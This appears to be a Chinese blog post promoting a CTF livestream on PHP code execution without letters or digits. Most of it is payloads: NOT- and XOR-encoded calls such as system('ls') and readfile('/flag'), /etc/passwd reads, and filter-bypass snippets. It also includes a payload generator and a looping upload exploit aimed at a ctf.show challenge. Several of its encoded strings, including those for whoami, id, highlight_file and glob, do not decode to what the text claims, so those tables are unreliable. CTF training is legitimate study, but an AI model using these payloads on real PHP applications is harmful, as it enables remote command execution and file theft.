#  CTF直播预告：无字母数字命令执行详解  
原创 小话安全
                    小话安全  小话安全   2026-02-10 09:35  
  
直播时间：2月10日晚21点  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZaibPC5NLUVWpCpQpic20S86IHZNeYJd2ytA1KJl5HRtcicg8HL0hHwkSXU8J30MlZLlvaKBvPswNVyicXH4iaAt5CESjCf2h3dAlr2DnrRLnQXo/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZaibPC5NLUVWju2X5bySkM0qFu1USqapmB8YgWw6uCLwCxdOOCPow6uicfJc10v7M4Q5Uj48f5mdFibYibRicia17eicGWCcWicGAiczAVeucrcSqShU/640?wx_fmt=png&from=appmsg "")  
  
我们想要执行phpinfo()，但是不能使用字母和数字。这意味着我们不能直接写出字符串"phpinfo()"，因为其中包含了字母。  
  
一种常见的方法是使用PHP中的异或（^）或者取反（~）来构造字符串。但是注意，题目要求“无字母数字”，即我们不能使用任何字母（a-z, A-Z）和数字（0-9）。  
  
我们可以考虑使用非字母数字的字符来生成我们需要的字符串。  
  
步骤1：确认可用的字符集  
  
首先，我们需要明确题目允许我们使用哪些字符。通常，无字母数字命令执行题目允许使用数字和特殊字符，例如：0-9  
、!  
、@  
、#  
、$  
、%  
、^  
、&  
、*  
、(  
、)  
、-  
、+  
、=  
、{  
、}  
、[  
、]  
、|  
、\  
、:  
、;  
、"  
、'  
、<  
、>  
、?  
、,  
、.  
、/  
、~  
等。  
  
步骤2：确定目标字符串  
  
我们需要构造的目标字符串通常是一个函数名（如system  
、cat  
、ls  
等）或者命令参数。  
  
步骤3：选择构造方法  
  
根据题目环境和允许的字符集，选择一种构造方法。  
  
方法一：取反（~）构造  
  
在PHP中，~  
运算符可以对字符串进行按位取反。我们可以先写出目标字符串的每个字符，然后对每个字符的ASCII码进行取反（即255-ASCII码），得到新的字节值，然后将这些字节值用URL编码（百分号编码）表示，最后用~  
运算符作用于这个字符串，就可以得到目标字符串。  
```
 例如，要构造`phpinfo`，我们可以计算每个字符取反后的字节，然后组成一个字符串，用`~`运算符。
 计算过程：
    p: 112 -> ~112 = 143 -> 十六进制：8F
    h: 104 -> ~104 = 151 -> 97
    p: 112 -> 8F
    i: 105 -> 96
    n: 110 -> 91
    f: 102 -> 99
    o: 111 -> 90
 所以，我们可以构造：`(~%8F%97%8F%96%91%99%90)()`，相当于`phpinfo()`。
```  
  
方法二：异或（^）构造  
  
异或运算也是常用的构造方法。我们可以选择两个非字母数字的字符进行异或，得到我们想要的字母。  
  
例如，我们可以用^  
运算符，选择两个特殊字符，使得它们的异或结果是我们想要的字母。  
  
但是，由于异或运算需要两个操作数，我们通常需要先构造出这两个操作数。一种常见的方式是，我们可以用两个字符串进行异或，这两个字符串都由我们允许的字符组成，但异或的结果是我们的目标字符串。  
```
 例如，我们想要构造`phpinfo`，我们可以找到两个字符串，每个字符都由非字母数字组成，且这两个字符串对应位置的字符异或后得到目标字符。
```  
  
方法三：自增构造  
  
在PHP中，如果我们能找到一个字母，我们可以通过自增运算符得到其他字母。例如，'a'++  
会变成'b'  
。但是，在无字母数字的情况下，我们如何得到第一个字母呢？  
  
我们可以利用数组的键名是字符串这一特性。例如，$_=[];$_=''.$_;  
这样可以得到一个字符串'Array'  
，然后我们就可以取出第一个字母'A'  
，然后通过自增得到其他字母。  
```
 但是，这种方法通常需要我们先有一个字母，而`Array`中的`A`是大写字母，我们可以通过自增得到其他大写字母，然后通过转换得到小写字母（例如，利用`strtolower`函数，但该函数名本身也需要构造）。
```  
  
方法四：利用PHP的短标签和shell命令执行  
  
有时候，我们可以使用<?=  
来输出，结合$  
和{  
、}  
来执行命令。例如，<?=${$_}(${_})  
，其中$_  
和_  
是我们构造的变量，分别包含函数名和参数。  
  
步骤4：构造payload并测试  
  
根据选择的构造方法，编写payload，并在题目环境中测试。  
  
步骤5：绕过长度限制（如果有）  
  
有时题目还会限制payload的长度，这时候我们需要考虑更短的构造方式，或者使用变量拼接、重复利用等技巧。  
  
下面，我们以取反构造为例，详细说明如何构造一个无字母数字的payload。  
  
取反构造的步骤：  
1. 确定目标字符串，例如：system('ls')  
。  
  
1. 将目标字符串拆分为两部分：函数名和参数。例如，函数名system  
，参数'ls'  
。  
  
1. 对函数名和参数分别进行取反编码。注意，参数中的字符串也需要编码，但参数本身是字符串，所以我们要构造的是system  
和ls  
这两个字符串，并且将它们放在正确的语法中。  
  
但是，注意：我们构造的payload最终会被eval执行，所以我们需要构造出合法的PHP代码。  
  
例如，我们要构造system('ls')  
，我们可以这样构造：  
  
函数名：system -> 取反编码  
  
参数：ls -> 取反编码  
  
但是，我们不能直接构造system('ls')  
，因为括号和引号也是字母数字以外的字符，我们可以使用。所以，我们可以构造：  
  
(~%8C%86%8C%8B%9A%92)('~%93%8C')  
  
其中，~%8C%86%8C%8B%9A%92  
解码后是system  
，~%93%8C  
解码后是ls  
。  
  
但是，这样写payload是(~%8C%86%8C%8B%9A%92)(~%93%8C)  
，这样会调用system  
函数，参数是ls  
。但是，注意，这里参数是字符串ls  
，所以我们需要用引号吗？实际上，system  
函数接收字符串参数，但是我们在PHP代码中，(~%93%8C)  
的结果就是字符串ls  
，所以不需要引号。  
### 步骤1：分析限制条件  
1. **识别过滤规则**  
  
1. 字母过滤：a-zA-Z  
  
1. 数字过滤：0-9  
  
1. 特殊字符过滤  
  
1. 长度限制  
  
**2. 确定可用字符集**  
```
通常可用的：
~ ! @ # $ % ^ & * ( ) _ + - = { } [ ] | \ : ; " ' < > , . ? / `
空格 TAB 换行符
```  
### 步骤2：环境信息收集  
```
# 常用的信息收集方式
?c=phpinfo();       # 查看PHP配置
?c=print_r(get_defined_functions());  # 查看可用函数
?c=var_dump(scandir('.'));  # 查看目录
?c=readfile('/etc/passwd');  # 测试读取文件
```  
### 步骤3：选择构造方法  
#### 方法1：位运算取反（最常用）  
```
// 原理：对字符取反
(~"字符串取反后的十六进制")()

// 示例：phpinfo()
(~%8F%97%8F%96%91%99%90)();
```  
  
**计算步骤：**  
1. 目标字符串：phpinfo  
  
1. 每个字符ASCII取反：p(112)→143, h(104)→151, ...  
  
1. 转换为十六进制：143→8F, 151→97, ...  
  
1. URL编码：%8F%97...  
  
本地脚本  
```
#!/usr/bin/env python3
# 快速生成payload
import sys
import urllib.parse

def quick_payload(func, args=None):
    # 快速生成取反payload
    inverted = ''.join(f'%{255-ord(c):02X}' for c in func)
    if args:
        args_inv = ''.join(f'%{255-ord(c):02X}' for c in args)
        return f'(~"{inverted}")(~"{args_inv}");'
    return f'(~"{inverted}")();'

# 常用payload速查
payloads = {
    'phpinfo': '(~%8F%97%8F%96%91%99%90)();',
    'system': '(~%8C%86%8C%8B%9A%92)();',
    'ls': '(~%93%8C)();',
    'cat': '(~%9C%9E%8B)();',
    'id': '(~%96%93)();',
    'whoami': '(~%99%96%9A%92%9E%8D%96)();'
}
print(quick_payload('phpinfo'))
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZaibPC5NLUVWtDtnqAqChkibDFsxzibKeuibyePBJB6Nta5GiclXic0wnkmxadlCAXIDmXXbtTricGVwQyv0BXF9M2stJa8ibqmtZ6sj2GqJBibnsr7o/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZaibPC5NLUVV4j9phRUPAPyIH2Tfcmqk0PBAZIjSoHGpT5lBEC5dLjosDEzQlySIseFMsIejZOGZhgP3JHORUddjDaa7RrWRoHYGK20q7rIc/640?wx_fmt=png&from=appmsg "")  
  
方法2：异或运算（XOR）  
```
// 原理：A^B=C, A^C=B
("非字母数字"^"非字母数字")()  // 得到字母

// 示例：构造_GET
${$_}[_](${$_}[__]);  // 使用_和__变量
```  
#### 方法3：自增构造  
```
// 原理：利用PHP的字符串自增特性
$_=[];          // $_=Array
$_=$_.'';       // $_='Array'
$_=$_[1];       // $_='r' (Array[1])
++$_;++$_;...   // r→s→t...

// 示例：构造assert
$_=[];$_=$_.'';$___=$_[1];$__=$_[0];$____=$_[3];...
```  
#### 方法4：利用PHP特性  
1. **利用$_GET/$_POST参数名**  
  
```
// ?a=system&b=ls
$_GET[a]($_GET[b]);
```  
  
**2. 利用${_}变量**  
```
${_}=phpinfo;${_}();
```  
  
**3. 利用反引号执行命令**  
```
`ls`;  // 反引号内的内容会被执行
```  
### 步骤5：绕过进阶限制  
#### 限制1：禁用括号()  
```
// 使用反引号、include、require等
`ls`;
include "php://filter/convert.base64-encode/resource=flag.php";
```  
#### 限制2：禁用分号;  
```
// 使用标签或eval
<?php system('ls')?>
<?=system('ls')?>
eval(system('ls'))
```  
#### 限制3：禁用引号' "  
```
// 使用常量定义或heredoc
define('CMD', 'ls'); system(CMD);
system(<<<EOF
ls
EOF
);
```  
#### 限制4：长度限制  
```
// 使用变量缩短
$_=system;$_('ls');           // 8字符
$a=ls;system($a);            // 10字符

// 最短payload示例
`ls`;    // 4字符
?><?=`ls`;  // 7字符
```  
### 步骤6：获取flag的常用姿势  
#### 直接读取文件  
```
// 使用取反构造readfile
(~%8D%9C%9E%8B%96%93%9A%91%8B)('/flag');  // readfile('/flag')

// 使用highlight_file
(~%96%91%99%90%93%96%9E%92%96%84)(~%99%93%9E%98%D1%8F%97%8F);  // highlight_file('flag.php')
```  
#### 目录遍历  
```
// scandir查看目录
(~%8C%9C%9E%91%9B%96%8D)(~%8C%9C);  // scandir('.')
(~%9C%9E%8B)('.');                 // dir('.')

// 使用glob匹配
(~%90%93%96%91)(~%9A%99%96%93%8D);  // glob('*')
```  
```
import requests  # 导入requests库，用于发送HTTP请求
import time      # 导入time库，用于处理时间相关的操作（如等待）
import sys       # 导入sys库，用于系统相关的操作（如退出程序）

# 定义目标URL，即CTF挑战的地址
TARGET_URL = "http://4072355f-0002-4920-a2e5-65ad785e1b70.challenge.ctf.show/"

# 定义payload文件的路径，该文件内容将用于攻击
PAYLOAD_FILE_PATH = "payload.txt"

# 定义用于检查响应中是否包含flag的字符串，通常flag以"CTF{"开头
CHECK_FLAG_STR = "CTF{"

# 定义超时时间（秒），这里设置为300秒，即5分钟
TIMEOUT_SECONDS = 300

# 记录脚本开始运行的时间
start_time = time.time()

# 打开payload文件，以只读模式，使用utf-8编码
with open(PAYLOAD_FILE_PATH, "r", encoding="utf-8") as f:
    # 构建一个文件字典，键为"file"，值为文件对象，这将在multipart/form-data中用于文件上传
    file = {"file": f}
    # 构建数据字典，键为"code"，值为一个字符串payload，这个payload用于命令执行
    data = {"code": ". /???/????????[@-[]"}

    # 打印开始攻击的信息
    print(f"开始向 {TARGET_URL} 发送请求...")

    # 循环，直到超过设定的超时时间
    while time.time() - start_time < TIMEOUT_SECONDS:
        try:
            # 发送POST请求，上传文件并携带数据，设置超时时间为10秒，不允许重定向
            response = requests.post(
                TARGET_URL, files=file, data=data, timeout=10, allow_redirects=False
            )

            # 检查响应文本中是否包含flag的起始字符串
            if CHECK_FLAG_STR in response.text:
                # 如果包含，找到flag的开始位置
                start = response.text.find(CHECK_FLAG_STR)
                # 从开始位置找到第一个'}'的位置，并加1以包含这个字符
                end = response.text.find("}", start) + 1
                # 提取flag，如果找到了'}'则截取子串，否则从开始位置到结尾
                flag = (
                    response.text[start:end] if end > start else response.text[start:]
                )
                # 打印找到的flag，并退出程序（退出码0表示成功）
                print(f"✅ 找到Flag：{flag}")
                sys.exit(0)
            else:
                # 如果没有找到flag，打印等待信息，然后等待1秒
                print(f"⏳ 未找到flag，1秒后重试...")
                time.sleep(1)

        # 捕获所有异常
        except Exception as e:
            # 打印异常信息，然后等待1秒
            print(f"请求失败：{e}")
            time.sleep(1)

# 如果循环因为超时而退出，则打印超时信息，并以退出码1结束程序（表示失败）
print(f"⏰ 超时：{TIMEOUT_SECONDS}秒内未找到flag")
sys.exit(1)
```  
  
  
